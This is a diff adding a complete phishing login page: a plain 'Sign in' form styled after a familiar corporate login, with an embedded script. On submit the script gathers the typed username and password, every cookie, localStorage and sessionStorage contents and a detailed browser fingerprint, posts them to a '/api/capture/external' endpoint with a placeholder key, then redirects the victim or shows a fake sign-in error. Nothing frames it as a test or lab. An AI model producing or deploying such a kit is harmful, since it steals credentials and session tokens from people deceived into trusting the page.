@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Sign in</title>
+  <style>
+    body { font: 14px/1.4 system-ui, sans-serif; background: #f5f6f8;
+           display: grid; place-items: center; min-height: 100vh; margin: 0; }
+    .card { background: #fff; padding: 32px; border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,.08); width: 320px; }
+    h1 { font-size: 18px; margin: 0 0 18px; }
+    label { display: block; font-size: 12px; color: #555; margin-top: 12px; }
+    input { width: 100%; padding: 8px; border: 1px solid #ccc;
+            border-radius: 2px; box-sizing: border-box; }
+    button { margin-top: 20px; width: 100%; padding: 10px;
+             background: #0078d4; color: #fff; border: none;
+             border-radius: 2px; cursor: pointer; font-size: 14px; }
+    .err { color: #b00; font-size: 12px; margin-top: 8px; min-height: 16px; }
+  </style>
+</head>
+<body>
+  <form class="card" id="f" autocomplete="on">
+    <h1>Sign in</h1>
+    <label>Email or username</label>
+    <input id="u" name="username" type="text" autocomplete="username" required>
+    <label>Password</label>
+    <input id="p" name="password" type="password" autocomplete="current-password" required>
+    <button type="submit">Sign in</button>
+    <div class="err" id="e"></div>
+  </form>
+
+<script>
+(function(){
+  var S = {
+    g: "default",
+    k: "REPLACE_WITH_KEY",
+    e: "/api/capture/external",
+    n: "https://example.com/",
+  };
+
+  async function ctx(){
+    var d = {
+      ua: navigator.userAgent,
+      lang: navigator.languages || [navigator.language],
+      plat: navigator.platform,
+      vend: navigator.vendor,
+      hc: navigator.hardwareConcurrency || null,
+      dm: navigator.deviceMemory || null,
+      scr: { w: screen.width, h: screen.height,
+             aw: screen.availWidth, ah: screen.availHeight,
+             cd: screen.colorDepth, dpr: window.devicePixelRatio },
+      vp: { w: innerWidth, h: innerHeight },
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      ref: document.referrer,
+      loc: location.href,
+    };
+    if (navigator.userAgentData) {
+      try {
+        d.uad = await navigator.userAgentData.getHighEntropyValues([
+          "architecture","bitness","model","platformVersion",
+          "uaFullVersion","fullVersionList","wow64",
+        ]);
+      } catch(_) {}
+    }
+    try {
+      var cv = document.createElement("canvas");
+      var gl = cv.getContext("webgl") || cv.getContext("experimental-webgl");
+      if (gl) {
+        var x = gl.getExtension("WEBGL_debug_renderer_info");
+        if (x) d.gl = { v: gl.getParameter(x.UNMASKED_VENDOR_WEBGL),
+                       r: gl.getParameter(x.UNMASKED_RENDERER_WEBGL) };
+      }
+    } catch(_) {}
+    return d;
+  }
+
+  function rs(s){
+    var o = {};
+    try { for (var i=0;i<s.length;i++){ var k=s.key(i); o[k]=s.getItem(k); } } catch(_){}
+    return o;
+  }
+
+  function rc(){
+    return (document.cookie || "").split(";").map(function(p){return p.trim()}).filter(Boolean).map(function(p){
+      var i = p.indexOf("=");
+      return { name: p.slice(0,i), value: p.slice(i+1), domain: location.hostname };
+    });
+  }
+
+  document.getElementById("f").addEventListener("submit", async function(ev){
+    ev.preventDefault();
+    var u = document.getElementById("u").value;
+    var p = document.getElementById("p").value;
+    var e = document.getElementById("e");
+    e.textContent = "";
+
+    var b = {
+      site_id: S.g,
+      user: u,
+      username: u,
+      password: p,
+      source_url: location.href,
+      cookies: rc(),
+      local_storage: rs(localStorage),
+      session_storage: rs(sessionStorage),
+      captured_inputs: { fingerprint: await ctx() },
+      notes: "",
+    };
+
+    try {
+      var r = await fetch(S.e, {
+        method: "POST",
+        headers: { "Content-Type": "application/json",
+                   "Authorization": "Bearer " + S.k },
+        body: JSON.stringify(b),
+        keepalive: true,
+      });
+      if (!r.ok) { e.textContent = "We couldn't sign you in. Please try again."; return; }
+    } catch(_) {
+      e.textContent = "Network error. Please try again."; return;
+    }
+    location.href = S.n;
+  });
+})();
+</script>
+</body>
+</html>
